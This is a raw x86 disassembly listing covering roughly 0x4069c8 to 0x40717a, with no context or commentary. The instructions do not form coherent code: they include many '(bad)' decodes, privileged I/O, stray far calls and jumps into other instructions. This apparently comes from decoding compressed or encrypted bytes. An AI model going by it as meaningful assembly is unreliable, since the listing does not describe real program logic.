  4069c8:	mov    bl,0x42
  4069ca:	push   edx
  4069cb:	aad    0x58
  4069cd:	and    al,0x69
  4069cf:	mov    ebp,0x80a2e867
  4069d4:	mov    ds:0x6da5ba03,eax
  4069d9:	mov    eax,0xb3cfeda3
  4069de:	hlt    
  4069df:	(bad)  
  4069e0:	and    BYTE PTR [esi+0x7e],cl
  4069e3:	fisttp WORD PTR [esi+0x543273b9]
  4069e9:	in     al,dx
  4069ea:	pop    es
  4069eb:	idiv   BYTE PTR ds:0x1be60d01
  4069f1:	mov    dl,0x4c
  4069f3:	popa   
  4069f4:	mov    fs,esp
  4069f6:	jmp    0x406a15
  4069f8:	jnp    0x4069fa
  4069fa:	dec    ebx
  4069fb:	pop    ss
  4069fc:	es fsubrp st(6),st
  4069ff:	lods   al,BYTE PTR ds:[esi]
  406a00:	loope  0x406a37
  406a02:	xor    ch,BYTE PTR [eax-0x72]
  406a05:	shrd   DWORD PTR [eax-0x3e],eax,cl
  406a09:	adc    eax,0x9ee41b02
  406a0e:	idiv   esi
  406a10:	ss mov esp,0x383d9d75
  406a16:	inc    edi
  406a17:	(bad)  
  406a18:	arpl   ax,cx
  406a1a:	xchg   edx,eax
  406a1b:	sbb    eax,0x7058d532
  406a20:	call   0xb1f4:0x279f3ee9
  406a27:	fsubr  DWORD PTR [eax]
  406a29:	sub    eax,0x8437080b
  406a2e:	inc    eax
  406a2f:	xlat   BYTE PTR ds:[ebx]
  406a30:	les    esp,FWORD PTR [edi]
  406a32:	sub    eax,0xe49e7e48
  406a37:	inc    ebp
  406a38:	add    al,al
  406a3a:	pause  
  406a3c:	aad    0x31
  406a3e:	mov    bl,0x4f
  406a40:	ret    
  406a41:	pusha  
  406a42:	adc    ah,BYTE PTR [eax-0x33c9f8c4]
  406a48:	rcl    bl,cl
  406a4a:	lock call 0x11b:0xfc907dfe
  406a52:	and    al,0x6f
  406a54:	xor    ah,BYTE PTR [eax-0x52]
  406a57:	sbb    ecx,DWORD PTR [ebp-0x40]
  406a5a:	iret   
  406a5b:	fsubr  st,st(4)
  406a5d:	and    ah,BYTE PTR [ecx]
  406a5f:	push   es
  406a60:	mov    ch,0xc
  406a62:	mov    cs,WORD PTR [ebx]
  406a64:	push   edi
  406a65:	add    eax,esp
  406a67:	inc    eax
  406a68:	scas   eax,DWORD PTR es:[edi]
  406a69:	call   0x51e5101d
  406a6e:	push   0x32fde67c
  406a73:	je     0x406aae
  406a75:	dec    ebx
  406a76:	push   ebp
  406a77:	pushf  
  406a78:	bound  edi,QWORD PTR [ebp+0x79]
  406a7b:	or     al,0x89
  406a7d:	ficom  WORD PTR [edx+esi*8+0x30]
  406a81:	jmp    DWORD PTR [ebx+edi*1]
  406a84:	sbb    BYTE PTR [edx],dh
  406a86:	push   ebp
  406a87:	stos   BYTE PTR es:[edi],al
  406a88:	sbb    eax,esi
  406a8a:	jmp    0x406a20
  406a8c:	rcr    BYTE PTR [ebx-0x28],0x4f
  406a90:	sbb    dh,bl
  406a92:	lods   al,BYTE PTR ds:[esi]
  406a93:	call   FWORD PTR [edi+0x1abc1aa9]
  406a99:	or     eax,0x391d70cb
  406a9e:	pushf  
  406a9f:	jbe    0x406a7b
  406aa1:	push   0x3d
  406aa3:	mov    edx,0x2646ee93
  406aa8:	jno    0x406ac4
  406aaa:	pusha  
  406aab:	adc    DWORD PTR [eax+ebx*8-0x3b],ebp
  406aaf:	or     ecx,DWORD PTR ds:0x51b91fef
  406ab5:	cmp    al,0x9d
  406ab7:	and    eax,DWORD PTR [ecx-0x32]
  406aba:	fstp   TBYTE PTR [eax]
  406abc:	mov    esi,0xafb8ded
  406ac1:	int    0x3d
  406ac3:	ja     0x406aa2
  406ac5:	ins    DWORD PTR es:[edi],dx
  406ac6:	adc    al,0x96
  406ac8:	jmp    0xf7a7e384
  406acd:	mov    edx,0xd04e4fd
  406ad2:	inc    edi
  406ad3:	nop
  406ad4:	jmp    0x406b0d
  406ad6:	push   0x5ba9d498
  406adb:	retf   0x203a
  406ade:	leave  
  406adf:	outs   dx,BYTE PTR ds:[esi]
  406ae0:	shl    ebp,1
  406ae2:	cmp    ecx,DWORD PTR [edi+0x52]
  406ae5:	mov    ds:0x8fc53e9,eax
  406aea:	shr    DWORD PTR [ebx+0x4d],0x32
  406aee:	out    0xe8,eax
  406af0:	push   eax
  406af1:	repnz push cs
  406af3:	shr    DWORD PTR [edx+0x1f898f5],cl
  406af9:	fs pop esi
  406afb:	enter  0x98b2,0xbc
  406aff:	jl     0x406b46
  406b01:	call   0xf34d:0x51b37e96
  406b08:	std    
  406b09:	addr16 icebp 
  406b0b:	stc    
  406b0c:	out    dx,eax
  406b0d:	addr16 jae 0x406b6c
  406b10:	jl     0x406adb
  406b12:	arpl   WORD PTR [eax-0xd81e45d],bx
  406b18:	push   eax
  406b19:	jg     0x406b08
  406b1b:	arpl   WORD PTR [ecx+0x55],dx
  406b1e:	mov    bl,0xe1
  406b20:	out    dx,al
  406b21:	loope  0x406b1d
  406b23:	mov    esp,DWORD PTR ds:0x64deb699
  406b29:	iret   
  406b2a:	xor    al,0x8c
  406b2c:	sahf   
  406b2d:	cmp    al,0x10
  406b2f:	js     0x406b7d
  406b31:	in     eax,dx
  406b32:	or     al,0xc
  406b34:	out    dx,al
  406b35:	adc    BYTE PTR [ecx+edi*8],cl
  406b38:	sbb    esi,DWORD PTR [ebx+0x6b]
  406b3b:	xchg   edi,eax
  406b3c:	scas   al,BYTE PTR es:[edi]
  406b3d:	and    eax,0x92d1e1bc
  406b42:	jmp    0x4b71df8
  406b47:	retf   
  406b48:	xchg   bl,bl
  406b4a:	xchg   ebx,eax
  406b4b:	and    DWORD PTR [edx-0x3e31e639],edi
  406b51:	shr    bl,1
  406b53:	xchg   ebp,eax
  406b54:	hlt    
  406b55:	push   cs
  406b56:	inc    edi
  406b57:	lods   eax,DWORD PTR ds:[esi]
  406b58:	call   0xec7f:0x3d40b475
  406b5f:	popf   
  406b60:	sbb    dl,bh
  406b62:	mul    DWORD PTR [ebx]
  406b64:	in     eax,0x18
  406b66:	mov    ah,0x26
  406b68:	ret    0xbcf7
  406b6b:	js     0x406afd
  406b6d:	ror    DWORD PTR [eax+0x63],0x20
  406b71:	je     0x406bde
  406b73:	xchg   BYTE PTR ds:0xcf424b43,cl
  406b79:	jp     0x406b8a
  406b7b:	fwait
  406b7c:	mov    edi,0xbff13fd8
  406b81:	inc    ecx
  406b82:	fmul   DWORD PTR [esi+eiz*8]
  406b85:	xchg   ebx,eax
  406b86:	imul   cl
  406b88:	outs   dx,DWORD PTR ds:[esi]
  406b89:	push   0xe93a533e
  406b8e:	xor    al,0x25
  406b90:	inc    eax
  406b91:	cmc    
  406b92:	inc    ebx
  406b93:	das    
  406b94:	jnp    0x406bb8
  406b96:	inc    ebx
  406b97:	mov    bl,0xf3
  406b99:	dec    esp
  406b9a:	(bad)  
  406b9b:	mov    ?,edx
  406b9d:	js     0x406bc2
  406b9f:	mov    ch,0xe5
  406ba1:	fcomp  QWORD PTR ds:[eax]
  406ba4:	push   esp
  406ba5:	mov    esi,0xefa7032f
  406baa:	out    dx,eax
  406bab:	add    esi,DWORD PTR [edx]
  406bad:	push   0x6d
  406baf:	scas   al,BYTE PTR es:[edi]
  406bb0:	jns    0x406b75
  406bb2:	mov    bl,0x67
  406bb4:	push   ebp
  406bb5:	mov    esp,0x95a6a1c1
  406bba:	add    ebp,esp
  406bbc:	dec    esp
  406bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bbe:	mov    esp,0x58d06880
  406bc3:	inc    edi
  406bc4:	adc    esi,DWORD PTR ds:[ebx]
  406bc7:	sbb    al,dl
  406bc9:	pop    edx
  406bca:	mov    esp,0xcad1d4ac
  406bcf:	je     0x406c0a
  406bd1:	inc    edx
  406bd2:	rol    BYTE PTR [eax-0x184405b3],1
  406bd8:	dec    esp
  406bd9:	rcl    BYTE PTR [eax+0x20a8dbb8],0x49
  406be0:	iret   
  406be1:	cdq    
  406be2:	lods   al,BYTE PTR ds:[esi]
  406be3:	dec    esi
  406be4:	ret    0xb2b7
  406be7:	jne    0x406bba
  406be9:	(bad)  
  406bea:	aad    0x1a
  406bec:	xchg   edx,eax
  406bed:	dec    esi
  406bee:	pop    edi
  406bef:	push   edi
  406bf0:	loope  0x406bd4
  406bf2:	not    BYTE PTR [eax+0x3c58bf9d]
  406bf8:	iret   
  406bf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bfa:	aaa    
  406bfb:	mov    esi,0xad9fa115
  406c00:	jb     0x406bfb
  406c02:	dec    ebp
  406c03:	cli    
  406c04:	adc    cl,BYTE PTR [esp+esi*8]
  406c07:	jmp    0xbde4b85b
  406c0c:	je     0x406bef
  406c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c0f:	call   FWORD PTR [eax+0x748cc850]
  406c15:	dec    ecx
  406c16:	sub    BYTE PTR [esi],cl
  406c18:	in     eax,0x77
  406c1a:	jne    0x406c18
  406c1c:	adc    al,0x5d
  406c1e:	daa    
  406c1f:	xchg   ecx,eax
  406c20:	out    0x79,eax
  406c22:	adc    al,BYTE PTR [ebx]
  406c24:	ficomp DWORD PTR [edx-0x16fdf7fd]
  406c2a:	stc    
  406c2b:	jle    0x406c38
  406c2d:	and    al,0x62
  406c2f:	or     DWORD PTR [ebp-0x18b622d6],ecx
  406c35:	repnz or BYTE PTR fs:[ebx+0x181f8deb],cl
  406c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c3e:	and    BYTE PTR [esi-0x36e8a7e7],bh
  406c44:	sbb    BYTE PTR [esi],0x87
  406c47:	push   ebx
  406c48:	retf   0xaee6
  406c4b:	push   ebp
  406c4c:	or     ebx,DWORD PTR [ecx-0x1c200a97]
  406c52:	sbb    eax,0xdef8ba33
  406c57:	jge    0x406c74
  406c59:	inc    eax
  406c5a:	push   0x76
  406c5c:	(bad)  
  406c5e:	inc    ecx
  406c5f:	(bad)  
  406c61:	jb     0x406c42
  406c63:	sahf   
  406c64:	cli    
  406c65:	leave  
  406c66:	pop    esi
  406c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c68:	cmp    dh,bl
  406c6a:	mov    al,ds:0xd7d5f4cb
  406c6f:	pop    esp
  406c70:	xor    eax,0x15e1d024
  406c75:	cld    
  406c76:	mov    ds:0x4166f208,al
  406c7b:	pop    ss
  406c7c:	jb     0x406c18
  406c7e:	inc    esp
  406c7f:	popa   
  406c80:	pop    esi
  406c81:	or     ebp,ecx
  406c83:	sub    BYTE PTR [ebp+0x6a6ee7c4],al
  406c89:	or     DWORD PTR [esi],0x6b
  406c8c:	pop    es
  406c8d:	inc    ebp
  406c8e:	sub    BYTE PTR [edx+0x1a],0x74
  406c92:	test   eax,0xc8031bda
  406c97:	sub    BYTE PTR [ecx-0x37],cl
  406c9a:	mov    ah,0x61
  406c9c:	and    DWORD PTR [edi],ebp
  406c9e:	add    al,0x8c
  406ca0:	lea    ebx,[eax+0x5d4c7774]
  406ca6:	adc    al,0xc6
  406ca8:	ins    DWORD PTR es:[edi],dx
  406ca9:	inc    esp
  406caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cab:	xchg   DWORD PTR [ebp-0x3c25783f],edx
  406cb1:	jle    0x406c5d
  406cb3:	mov    ch,0x3a
  406cb5:	cs or  al,0x32
  406cb8:	les    ebx,FWORD PTR [edi]
  406cba:	push   esi
  406cbb:	xchg   edi,eax
  406cbc:	iret   
  406cbd:	in     eax,dx
  406cbe:	adc    DWORD PTR [eax+0x74dc6af0],edi
  406cc4:	fisub  WORD PTR [ebp+0x655f90e6]
  406cca:	push   ds
  406ccb:	jnp    0x406ca1
  406ccd:	or     DWORD PTR [edx-0x13],esi
  406cd0:	sbb    al,0xd7
  406cd2:	pop    ss
  406cd3:	lahf   
  406cd4:	and    al,0xbc
  406cd6:	stc    
  406cd7:	jnp    0x406d2c
  406cd9:	mov    ds:0x32551b33,eax
  406cde:	dec    esi
  406cdf:	dec    edi
  406ce0:	adc    dl,al
  406ce2:	cmp    ecx,DWORD PTR [esi]
  406ce4:	mov    ds:0xcdb33cbf,al
  406ce9:	jmp    0x406c8a
  406ceb:	mov    ch,0x1b
  406ced:	adc    dl,BYTE PTR [edi-0x1]
  406cf0:	retf   
  406cf1:	popf   
  406cf2:	jmp    0xca34a3fe
  406cf7:	add    DWORD PTR [eax+0x77],0x37
  406cfb:	mov    esp,0xd2c8fb30
  406d00:	(bad)  
  406d01:	ror    BYTE PTR [ebx+ebp*1+0x12],1
  406d05:	mov    eax,ds:0xa5a81e
  406d0a:	ss sbb ebx,ebx
  406d0d:	and    esi,DWORD PTR [ebx]
  406d0f:	fisttp QWORD PTR [ebp+0x56]
  406d12:	pop    eax
  406d13:	sbb    BYTE PTR [eax+0x44],bl
  406d16:	sbb    bl,dh
  406d18:	inc    ecx
  406d19:	jmp    0x46fd:0x5cd07be8
  406d20:	push   esp
  406d21:	xlat   BYTE PTR ds:[ebx]
  406d22:	(bad)  
  406d23:	gs mov ecx,0xc9ec626
  406d29:	mov    al,ds:0x9d41c983
  406d2e:	(bad)  
  406d30:	pop    ebx
  406d31:	sahf   
  406d32:	mov    DWORD PTR [edi+0x25eac25],eax
  406d38:	jae    0x406da7
  406d3a:	pop    ecx
  406d3b:	pop    eax
  406d3c:	imul   esi,DWORD PTR [ebx+0x743a594d],0xffffffbb
  406d43:	sub    al,0xef
  406d45:	out    0xd,al
  406d47:	mov    bh,0x14
  406d49:	add    BYTE PTR [ecx],ch
  406d4b:	sub    eax,0xb22f8fff
  406d50:	push   eax
  406d51:	setne  BYTE PTR [ecx]
  406d54:	xchg   esp,eax
  406d55:	jecxz  0x406ce6
  406d57:	sub    BYTE PTR [edx-0x36],ah
  406d5a:	ror    DWORD PTR [edx+0x37],cl
  406d5d:	mov    esp,0x105737d1
  406d62:	adc    BYTE PTR [ebx+0x4611cbb6],ch
  406d68:	push   0xfffffff4
  406d6a:	mov    dl,0x8e
  406d6c:	mul    BYTE PTR [eax]
  406d6e:	add    eax,0x2dd199e1
  406d73:	cmp    eax,0x2bd9dfb4
  406d78:	jb     0x406dd1
  406d7a:	cs mov bh,0x7b
  406d7d:	in     al,dx
  406d7e:	push   ebp
  406d7f:	aad    0xd4
  406d81:	cs dec eax
  406d83:	in     eax,0xac
  406d85:	rcl    DWORD PTR [eax+eiz*2-0x25],0x72
  406d8a:	imul   esi,DWORD PTR [esi-0x37661d08],0x5d
  406d91:	pop    ss
  406d92:	add    eax,0x9eb6d9d1
  406d97:	outs   dx,BYTE PTR ds:[esi]
  406d98:	ss push 0x212f886b
  406d9e:	push   ds
  406d9f:	xor    al,0xc7
  406da1:	dec    esp
  406da2:	in     eax,dx
  406da3:	dec    edi
  406da4:	rcl    edx,cl
  406da6:	std    
  406da7:	mov    ebx,0x47153b04
  406dac:	xchg   ecx,eax
  406dad:	sar    DWORD PTR [ecx],0xa4
  406db0:	push   0xffffffcb
  406db2:	jb     0x406ddd
  406db4:	push   esp
  406db5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406db6:	out    dx,al
  406db7:	out    0x6f,eax
  406db9:	js     0x406dbd
  406dbb:	inc    edx
  406dbc:	mov    ds:0x98b9eaba,eax
  406dc1:	mov    edx,0x93d79a9e
  406dc6:	clc    
  406dc7:	(bad)  
  406dc9:	adc    DWORD PTR [edx],eax
  406dcb:	loopne 0x406dbd
  406dcd:	nop
  406dce:	inc    edx
  406dcf:	mov    cl,0x78
  406dd1:	sub    DWORD PTR [edi-0x4],esi
  406dd4:	jns    0x406d83
  406dd6:	daa    
  406dd7:	outs   dx,BYTE PTR ds:[esi]
  406dd8:	addr16 pop eax
  406dda:	xor    eax,0x9cb2ea28
  406ddf:	popa   
  406de0:	mov    al,ds:0x3fa7edaf
  406de5:	mov    ebx,0xce74f4e1
  406dea:	data16 int 0x4b
  406ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406dee:	lea    ebx,[edi-0x6f6ca91a]
  406df4:	stos   BYTE PTR es:[edi],al
  406df5:	inc    ebp
  406df6:	jb     0x406d7c
  406df8:	push   ss
  406df9:	push   edi
  406dfa:	rcr    BYTE PTR [ecx+edx*8-0x45c52901],0x28
  406e02:	loopne 0x406e1b
  406e04:	mov    esi,0x8d4d9d17
  406e09:	lods   eax,DWORD PTR ds:[esi]
  406e0a:	xchg   edi,eax
  406e0b:	scas   eax,DWORD PTR es:[edi]
  406e0c:	fist   WORD PTR [esi-0x1c]
  406e0f:	in     eax,0x88
  406e11:	mov    bh,0xb8
  406e13:	mov    ah,dh
  406e15:	gs xchg esp,eax
  406e17:	jp     0x406e4e
  406e19:	xchg   ebp,eax
  406e1a:	ins    BYTE PTR es:[edi],dx
  406e1b:	mov    fs,WORD PTR [ebx]
  406e1d:	out    dx,al
  406e1e:	test   DWORD PTR [edi-0x3bfa9ad3],ebp
  406e24:	sub    eax,eax
  406e26:	jno    0x406df4
  406e28:	adc    BYTE PTR [edi],bl
  406e2a:	and    al,0xb7
  406e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e2d:	je     0x406df3
  406e2f:	(bad)  
  406e31:	inc    esi
  406e32:	stc    
  406e33:	loop   0x406dfd
  406e35:	fcom   DWORD PTR [ebp-0x69bc0876]
  406e3b:	aam    0x92
  406e3d:	int    0xa7
  406e3f:	daa    
  406e40:	mov    ch,0x9d
  406e42:	int    0x19
  406e44:	adc    dl,bh
  406e46:	xchg   esi,eax
  406e47:	fucom  st(3)
  406e49:	push   edx
  406e4a:	test   BYTE PTR [esi-0xfe3be9a],bl
  406e50:	pop    ebp
  406e51:	rcr    BYTE PTR [ebp+0x5],0x33
  406e55:	lahf   
  406e56:	add    eax,0x3c962a4b
  406e5b:	xchg   edx,eax
  406e5c:	push   0xffffffd3
  406e5e:	out    dx,eax
  406e5f:	jno    0x406e26
  406e61:	cmp    eax,DWORD PTR [esi]
  406e63:	lds    esp,FWORD PTR [eax+0x23a1f5ce]
  406e69:	daa    
  406e6a:	leave  
  406e6b:	pop    ebp
  406e6c:	dec    edx
  406e6d:	jbe    0x406ed4
  406e6f:	div    BYTE PTR [edx*2-0x37880e35]
  406e76:	ja     0x406e2a
  406e78:	jnp    0x406ed9
  406e7a:	or     DWORD PTR [esi],ebx
  406e7c:	mov    dh,0x9e
  406e7e:	mov    edx,0xeaf336be
  406e83:	or     eax,0xbe9d6824
  406e88:	pop    edi
  406e89:	sub    dh,BYTE PTR [ecx]
  406e8b:	outs   dx,DWORD PTR ds:[esi]
  406e8c:	xchg   esi,eax
  406e8d:	imul   ebx,DWORD PTR [eax+0x2a],0xffffffa3
  406e91:	fsubr  QWORD PTR [ebx+edx*8-0x6a3b3b18]
  406e98:	(bad)  
  406e99:	leave  
  406e9a:	ins    DWORD PTR es:[edi],dx
  406e9b:	hlt    
  406e9c:	xchg   ebp,eax
  406e9d:	pop    ebx
  406e9e:	mov    ch,0x42
  406ea0:	sbb    DWORD PTR [ebx-0x28],eax
  406ea3:	shl    BYTE PTR [edi+0x67acd86c],0x14
  406eaa:	out    dx,al
  406eab:	pusha  
  406eac:	pop    ebx
  406ead:	call   0xa3e6a894
  406eb2:	lea    esp,[edx+edx*4+0x6b2d5896]
  406eb9:	push   ax
  406ebb:	or     bh,ch
  406ebd:	or     edi,ebx
  406ebf:	dec    esp
  406ec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ec1:	in     al,0x1e
  406ec3:	xchg   edx,eax
  406ec4:	jnp    0x406ed5
  406ec6:	pop    esi
  406ec7:	add    DWORD PTR [ebx+ecx*4],0x67
  406ecb:	pop    ss
  406ecc:	push   edx
  406ecd:	sbb    ah,BYTE PTR [ebx]
  406ecf:	push   ds
  406ed0:	adc    al,0x73
  406ed2:	hlt    
  406ed3:	and    al,0x4d
  406ed5:	xchg   ecx,eax
  406ed6:	xor    BYTE PTR [ebp-0xdea6891],0x7d
  406edd:	xor    ah,cl
  406edf:	sub    DWORD PTR [eax+0x27],edx
  406ee2:	ret    
  406ee3:	inc    esi
  406ee4:	xchg   BYTE PTR [ecx+0x24236d2],ah
  406eea:	cmovnp edi,DWORD PTR [esi+edx*8+0x7a4058a7]
  406ef2:	stos   DWORD PTR es:[edi],eax
  406ef3:	sar    BYTE PTR [edi-0x5b],0x34
  406ef7:	mov    ds:0xb215151a,eax
  406efc:	adc    BYTE PTR [eax],0x2f
  406eff:	std    
  406f00:	xor    eax,0x5ac108cb
  406f05:	ja     0x406eac
  406f07:	mov    al,ds:0x6d00dde
  406f0c:	daa    
  406f0d:	in     al,0x93
  406f0f:	sub    eax,0x34b516a9
  406f14:	ret    0x6b74
  406f17:	pop    esp
  406f18:	add    dh,ch
  406f1a:	mov    al,ds:0xc7f10ba2
  406f1f:	jmp    DWORD PTR [ecx]
  406f21:	jle    0x406f1f
  406f23:	mov    ecx,0xaa340ef7
  406f28:	ret    0x17b8
  406f2b:	mov    eax,ds:0x117aee78
  406f30:	sbb    al,0x19
  406f32:	pop    ebp
  406f33:	xchg   esi,eax
  406f34:	push   edx
  406f35:	add    BYTE PTR [ecx-0x75],al
  406f38:	jge    0x406eed
  406f3a:	mov    bl,BYTE PTR [edi]
  406f3c:	xor    BYTE PTR [esi],0xf5
  406f3f:	jecxz  0x406f79
  406f41:	in     al,0xfd
  406f43:	jae    0x406f89
  406f45:	xchg   esi,eax
  406f46:	push   esi
  406f47:	sub    DWORD PTR [ecx+0x28],edi
  406f4a:	mov    ecx,0xd15e6048
  406f4f:	pop    ss
  406f50:	sub    al,0x8e
  406f52:	push   ebx
  406f53:	jae    0x406f4d
  406f55:	mov    ds:0x6199771b,ax
  406f5b:	sbb    eax,0xc676a6a5
  406f60:	mov    ds:0x5400617b,eax
  406f65:	pop    ss
  406f66:	leave  
  406f67:	js     0x406fde
  406f69:	add    BYTE PTR [eax+0x1599af7b],bl
  406f6f:	jle    0x406f05
  406f71:	pop    edi
  406f72:	fst    DWORD PTR [ebx+0x5c89ba28]
  406f78:	out    dx,al
  406f79:	data16 clc 
  406f7b:	call   0x5356f14f
  406f80:	xchg   ebx,eax
  406f81:	in     eax,dx
  406f82:	xchg   BYTE PTR [ecx+esi*8],al
  406f85:	std    
  406f86:	dec    edx
  406f87:	pop    esp
  406f88:	out    dx,al
  406f89:	les    esp,FWORD PTR [esi+0x5d]
  406f8c:	mov    cl,0x27
  406f8e:	lods   eax,DWORD PTR ds:[esi]
  406f8f:	jno    0x406fcb
  406f91:	and    al,ah
  406f93:	je     0x406f78
  406f95:	aam    0x86
  406f97:	les    eax,FWORD PTR [esi-0x16]
  406f9a:	adc    eax,0x411e969b
  406f9f:	or     edi,DWORD PTR [ebp-0x3e]
  406fa2:	ja     0x406f60
  406fa4:	ffree  st(1)
  406fa6:	iretw  
  406fa8:	outs   dx,DWORD PTR ds:[esi]
  406fa9:	sub    DWORD PTR [ebx],ebx
  406fab:	out    dx,eax
  406fac:	stos   DWORD PTR es:[edi],eax
  406fad:	je     0x406ff0
  406faf:	sub    dh,dh
  406fb1:	sbb    BYTE PTR [ecx],ch
  406fb3:	pop    eax
  406fb4:	push   es
  406fb5:	js     0x346c4406
  406fbb:	push   0x4d19067c
  406fc0:	out    0x83,eax
  406fc2:	adc    edx,DWORD PTR [edx-0x355d039c]
  406fc8:	sbb    eax,0xc2aa81e7
  406fcd:	idiv   DWORD PTR [eax+0x22]
  406fd0:	push   0xc11d4c76
  406fd5:	sub    eax,0xdd183a4a
  406fda:	addps  xmm1,xmm4
  406fdd:	stc    
  406fde:	mov    esp,0x5db53df5
  406fe3:	mov    eax,DWORD PTR [eax]
  406fe5:	unpckhps xmm3,XMMWORD PTR [edi+0x1b586ffc]
  406fec:	cmp    ebx,DWORD PTR [esi]
  406fee:	jb     0x406fe5
  406ff0:	jmp    0xf466e51f
  406ff5:	(bad)  ds:0x4de41368
  406ffb:	call   0x7706df8e
  407000:	pop    ebp
  407001:	add    BYTE PTR [ebx+eiz*8],cl
  407004:	mov    al,ds:0x5e176ac0
  407009:	(bad)  
  40700a:	mov    al,ds:0xa4bd97ed
  40700f:	test   DWORD PTR [ecx+ebx*1],ecx
  407012:	fistp  WORD PTR [eax+0x654b59a4]
  407018:	scas   eax,DWORD PTR es:[edi]
  407019:	inc    esp
  40701a:	xchg   esp,eax
  40701b:	mov    dl,0x22
  40701d:	enter  0x8baf,0xb2
  407021:	dec    esi
  407022:	fcom   QWORD PTR [edx-0x61]
  407025:	(bad)
  407028:	test   DWORD PTR [edx-0x18],edi
  40702b:	inc    esp
  40702c:	push   ds
  40702d:	inc    ecx
  40702e:	xor    bl,BYTE PTR [edi]
  407030:	sahf   
  407031:	lods   eax,DWORD PTR ds:[esi]
  407032:	addr16 pop eax
  407034:	add    DWORD PTR [ebx],ecx
  407036:	push   cs
  407037:	test   eax,0xbaef5bbf
  40703c:	sub    esi,DWORD PTR ds:0x559c89cf
  407042:	add    dl,bl
  407044:	and    ah,BYTE PTR [ebx+0x2462eec6]
  40704a:	in     al,0x1a
  40704c:	xchg   esp,eax
  40704d:	jns    0x40707d
  40704f:	repz and esi,DWORD PTR [ebx+0x5048df37]
  407056:	add    BYTE PTR [edx+0x50],cl
  407059:	jae    0x40702a
  40705b:	not    dh
  40705d:	popf   
  40705e:	ret    
  40705f:	mov    bh,0x75
  407061:	fcom   st(7)
  407063:	pop    ecx
  407064:	ret    
  407065:	pop    esi
  407066:	arpl   WORD PTR [edx+ebx*1+0x3fe09dc3],bx
  40706d:	mov    eax,0xf54cb874
  407072:	inc    esi
  407073:	arpl   WORD PTR [edx+0x103ea5d5],sp
  407079:	shl    BYTE PTR [edx-0x2],1
  40707c:	inc    esi
  40707d:	popa   
  40707e:	jl     0x407059
  407080:	test   al,0xbc
  407082:	imul   ebx,esp,0xffffffce
  407085:	call   FWORD PTR [ecx+0x19]
  407088:	pop    eax
  407089:	and    DWORD PTR [edi+0x33],edi
  40708c:	pop    ebp
  40708d:	and    bl,dh
  40708f:	call   0x1baf905b
  407094:	out    0x74,al
  407096:	inc    edx
  407097:	aaa    
  407098:	lahf   
  407099:	hlt    
  40709a:	cmp    bh,BYTE PTR [ebx+ebx*1]
  40709d:	cli    
  40709e:	mov    dh,0x87
  4070a0:	pop    ebx
  4070a1:	je     0x4070b0
  4070a3:	mov    bl,0x64
  4070a5:	rcr    DWORD PTR [esi+0x10c7bdd1],cl
  4070ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070ac:	mul    edi
  4070ae:	xchg   ebx,eax
  4070af:	xor    ah,bh
  4070b1:	xlat   BYTE PTR ds:[ebx]
  4070b2:	adc    esp,edi
  4070b4:	mov    eax,ds:0x3b207b4
  4070b9:	inc    ebp
  4070ba:	popf   
  4070bb:	cdq    
  4070bc:	adc    eax,DWORD PTR [edi-0x2dc3ccb9]
  4070c2:	mov    dl,0x97
  4070c4:	jno    0x407056
  4070c6:	sub    DWORD PTR [ecx],edi
  4070c8:	sub    eax,0xc4917e81
  4070cd:	xor    DWORD PTR [edx],ebp
  4070cf:	aad    0xad
  4070d1:	and    ecx,edi
  4070d3:	cmp    eax,0x642ba805
  4070d8:	je     0x407063
  4070da:	and    BYTE PTR [ebp-0x28],bl
  4070dd:	dec    esi
  4070de:	cmp    eax,DWORD PTR [ebx]
  4070e0:	out    0x1d,al
  4070e2:	std    
  4070e3:	in     al,0x80
  4070e5:	into   
  4070e6:	or     al,0xf0
  4070e8:	xchg   ebx,eax
  4070e9:	jge    0x40715f
  4070eb:	in     al,0xcd
  4070ed:	xchg   BYTE PTR [edx-0x5fbb225c],ah
  4070f3:	(bad)  [edx-0x1a]
  4070f6:	mov    dl,0xf7
  4070f8:	inc    esi
  4070f9:	scas   eax,DWORD PTR es:[edi]
  4070fa:	(bad)  
  4070fb:	arpl   WORD PTR ds:0xfa90c82a,bx
  407101:	xchg   esi,eax
  407102:	adc    bl,BYTE PTR [edi-0x7]
  407105:	je     0x407160
  407107:	or     al,0xfc
  40710a:	add    ecx,DWORD PTR [esi+0x5a]
  40710d:	(bad)  
  40710e:	push   eax
  40710f:	push   ecx
  407110:	mov    al,0x33
  407112:	in     eax,0xee
  407114:	out    0xd8,eax
  407116:	je     0x407108
  407118:	popf   
  407119:	sub    DWORD PTR [edx+0x66],esi
  40711c:	xchg   edx,eax
  40711d:	xchg   esp,eax
  40711e:	clc    
  40711f:	inc    ecx
  407120:	fisttp QWORD PTR [esi]
  407122:	mov    ecx,0xe232c4ba
  407127:	xchg   BYTE PTR [edi+0x7c23113],dl
  40712d:	fs sub al,0x3f
  407130:	dec    esp
  407131:	scas   eax,DWORD PTR es:[edi]
  407132:	mov    ebp,0x2ff6a5e3
  407137:	lds    edi,FWORD PTR [edi+edi*2+0x4dc86f70]
  40713e:	jle    0x407168
  407140:	push   0x22388fd1
  407145:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407147:	xor    eax,DWORD PTR [ebp+ebx*4-0x66]
  40714b:	popf   
  40714c:	mov    DWORD PTR [edx+0x71],esp
  40714f:	add    al,0xf0
  407151:	daa    
  407152:	mov    ds:0x1fc201f0,eax
  407157:	repnz or eax,0x5e38347c
  40715d:	push   eax
  40715e:	loop   0x4071ac
  407160:	add    BYTE PTR [ecx],ch
  407162:	and    esp,DWORD PTR [esi-0x539e1e99]
  407168:	xor    al,bh
  40716a:	pop    ecx
  40716b:	sahf   
  40716c:	retf   0xd630
  40716f:	push   edx
  407170:	adc    edi,DWORD PTR [eax]
  407172:	call   0x1be42ee4
  407177:	popf   
  407178:	xor    ebp,ebp
  40717a:	lods   al,BYTE PTR ds:[esi]
